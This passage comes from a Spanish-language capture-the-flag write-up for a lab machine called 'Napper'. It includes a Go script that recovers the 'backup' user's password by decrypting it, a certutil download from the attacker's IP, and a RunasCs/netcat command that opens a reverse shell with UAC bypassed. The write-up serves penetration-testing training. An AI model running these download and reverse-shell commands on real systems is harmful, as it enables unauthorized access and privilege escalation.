</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;&#34;</span><span class=p>,</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>outputLines</span> <span class=p>=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Split</span><span class=p>(</span><span class=nb>string</span><span class=p>(</span><span class=nx>output</span><span class=p>),</span> <span class=s>&#34;\n&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>blob</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>line</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>outputLines</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>line</span><span class=p>,</span> <span class=s>&#34;blob&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>blob</span> <span class=p>=</span> <span class=nx>line</span>
</span></span><span class=line><span class=cl>			<span class=nx>blob</span> <span class=p>=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>TrimSpace</span><span class=p>(</span><span class=nx>strings</span><span class=p>.</span><span class=nf>Split</span><span class=p>(</span><span class=nx>line</span><span class=p>,</span> <span class=s>&#34;:&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>			<span class=nx>blob</span> <span class=p>=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Split</span><span class=p>(</span><span class=nx>blob</span><span class=p>,</span> <span class=s>&#34;\&#34;&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>seed</span><span class=p>,</span> <span class=nx>blob</span><span class=p>,</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>generateKey</span><span class=p>(</span><span class=nx>seed</span> <span class=kt>int64</span><span class=p>)</span> <span class=p>[]</span><span class=kt>byte</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>rand</span><span class=p>.</span><span class=nf>Seed</span><span class=p>(</span><span class=nx>seed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>key</span> <span class=o>:=</span> <span class=nb>make</span><span class=p>([]</span><span class=kt>byte</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=nx>i</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>key</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>key</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=p>=</span> <span class=nb>byte</span><span class=p>(</span><span class=mi>1</span> <span class=o>+</span> <span class=nx>rand</span><span class=p>.</span><span class=nf>Intn</span><span class=p>(</span><span class=mi>254</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>key</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>decryptCFB</span><span class=p>(</span><span class=nx>iv</span><span class=p>,</span> <span class=nx>ciphertext</span><span class=p>,</span> <span class=nx>key</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>)</span> <span class=p>([]</span><span class=kt>byte</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>block</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>aes</span><span class=p>.</span><span class=nf>NewCipher</span><span class=p>(</span><span class=nx>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>stream</span> <span class=o>:=</span> <span class=nx>cipher</span><span class=p>.</span><span class=nf>NewCFBDecrypter</span><span class=p>(</span><span class=nx>block</span><span class=p>,</span> <span class=nx>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>plaintext</span> <span class=o>:=</span> <span class=nb>make</span><span class=p>([]</span><span class=kt>byte</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=nx>ciphertext</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nx>stream</span><span class=p>.</span><span class=nf>XORKeyStream</span><span class=p>(</span><span class=nx>plaintext</span><span class=p>,</span> <span class=nx>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>plaintext</span><span class=p>,</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>seed</span><span class=p>,</span> <span class=nx>encryptedBlob</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nf>getSeed</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>key</span> <span class=o>:=</span> <span class=nf>generateKey</span><span class=p>(</span><span class=nx>seed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>decodedBlob</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>base64</span><span class=p>.</span><span class=nx>URLEncoding</span><span class=p>.</span><span class=nf>DecodeString</span><span class=p>(</span><span class=nx>encryptedBlob</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Error decoding base64:&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>iv</span> <span class=o>:=</span> <span class=nx>decodedBlob</span><span class=p>[:</span><span class=nx>aes</span><span class=p>.</span><span class=nx>BlockSize</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=nx>encryptedData</span> <span class=o>:=</span> <span class=nx>decodedBlob</span><span class=p>[</span><span class=nx>aes</span><span class=p>.</span><span class=nx>BlockSize</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>decryptedData</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nf>decryptCFB</span><span class=p>(</span><span class=nx>iv</span><span class=p>,</span> <span class=nx>encryptedData</span><span class=p>,</span> <span class=nx>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Error decrypting data:&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Key: %x\n&#34;</span><span class=p>,</span> <span class=nx>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;IV: %x\n&#34;</span><span class=p>,</span> <span class=nx>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Encrypted Data: %x\n&#34;</span><span class=p>,</span> <span class=nx>encryptedData</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Decrypted Data: %s\n&#34;</span><span class=p>,</span> <span class=nx>decryptedData</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li><p>De manera que este script funciona de la siguiente manera:</p><ol><li>Realiza una petici√≥n <code>HTTP</code> usando las credenciales halladas, pero la contrase√±a est√° encodeada en <code>base64</code>.</li><li>Obtiene los campos para desencriptar la contrase√±a/datos.</li></ol></li><li><p><code>Decrypted data</code> ser√° la contrase√±a del usuario <code>backup</code>, dado que, como podemos ver, √©ste se encuentra presente en la m√°quina v√≠ctima:</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\&gt;net users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User accounts for \\NAPPER
</span></span></span><span class=line><span class=cl><span class=go>-------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Administrator            backup                   DefaultAccount
</span></span></span><span class=line><span class=cl><span class=go>example                  Guest                    ruben
</span></span></span><span class=line><span class=cl><span class=go>WDAGUtilityAccount
</span></span></span></code></pre></div><ul><li>Por ejemplo, si corremos el script una vez, obtenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ go run main.go
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Key: 1c569fd87440c4de3d7cad9b6ec42853
</span></span></span><span class=line><span class=cl><span class=go>IV: 141a38d86942b6b88f61302fcb347c4c
</span></span></span><span class=line><span class=cl><span class=go>Encrypted Data: 170b2aa35a81a3d2c96fd7d02364647d002d3019efe6b1c0632647919d1214ba9a7d16adaa98c4fb
</span></span></span><span class=line><span class=cl><span class=go>Decrypted Data: elmqJKWpMlVxlvXwcwGeYaPNrBIJUxDhGsdxbPUL
</span></span></span></code></pre></div><p>donde, antes de que cambie, <code>elmqJKWpMlVxlvXwcwGeYaPNrBIJUxDhGsdxbPUL</code> es la contrase√±a.</p><ul><li>No obstante, no tenemos servicios disponibles para utilizar herramientas como <code>Impacket</code> o <code>evil-winrm</code> y as√≠ loguear en la m√°quina como este nuevo usuario. De manera que podemos usar <code>RunasCs</code> (el cual puede ser descargado <a href=https://github.com/antonioCoco/RunasCs/releases class=external-link target=_blank rel=noopener>desde su repositorio de Github</a>), junto con el binario de <code>netcat</code> que hab√≠amos previamente transferido, para pivotear a otro usuario dentro de la m√°quina v√≠ctima. Corro <code>unzip</code> para descomprimir el <code>RunasCS</code> pre-buildeado, paso el ejecutable de <code>RunasCs</code> a la m√°quina v√≠ctima y lo guardo en el directorio <code>C:\Temp\www\internal\content\posts\internal-laps-alpha</code> con <code>certutil</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;certutil.exe -urlcache -split -f http://10.10.16.6:8081/RunasCs.exe C:\Temp\www\internal\content\posts\internal-laps-alpha\runascs.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  ca00
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span></code></pre></div><ul><li>Finalmente, corro <code>RunasCs</code> junto con el binario de <code>netcat</code>, luego de ponerme en mi equipo en escucha con <code>netcat</code> por el puerto <code>443</code> con:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;runascs.exe backup elmqJKWpMlVxlvXwcwGeYaPNrBIJUxDhGsdxbPUL &#34;C:\Users\Public\Downloads\nc.exe 10.10.16.6 443 -e C:\Windows\System32\cmd.exe&#34; -t 10 --bypass-uac
</span></span></span></code></pre></div><p>y obtengo una shell como el usuario <code>backup</code>, el cual tiene todos los privilegios (de manera que es pr√°cticamente equivalente al usuario <code>Administrator</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.240] 50953
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.3636]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>napper\backup
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami /priv
</span></span></span><span class=line><span class=cl><span class=go>whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                            Description                                                        State
</span></span></span><span class=line><span class=cl><span class=go>========================================= ================================================================== =======
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeSystemProfilePrivilege                  Profile system performance                                         Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeSystemtimePrivilege                     Change the system time                                             Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeBackupPrivilege                         Back up files and directories                                      Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeRestorePrivilege                        Restore files and directories                                      Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeShutdownPrivilege                       Shut down the system                                               Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeDebugPrivilege                          Debug programs                                                     Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeUndockPrivilege                         Remove computer from docking station                               Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeCreateGlobalPrivilege                   Create global objects                                              Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeTimeZonePrivilege                       Change the time zone                                               Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
</span></span></span></code></pre></div><p>Donde podemos, finalmente, leer la flag en el Desktop del usuario <code>Administrator</code>.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>